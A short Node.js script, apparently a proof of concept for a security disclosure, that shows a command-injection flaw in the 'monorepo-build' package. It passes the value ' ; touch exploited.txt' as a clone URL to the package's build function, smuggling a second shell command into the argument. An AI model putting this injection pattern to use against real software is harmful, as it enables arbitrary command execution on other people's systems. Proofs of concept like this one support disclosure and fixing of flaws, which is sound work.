
const pkg = require('monorepo-build');

const payload = " ; touch exploited.txt";

console.log(pkg);

const directory = process.cwd()
const cloneUrl = payload;

pkg.build(directory, cloneUrl);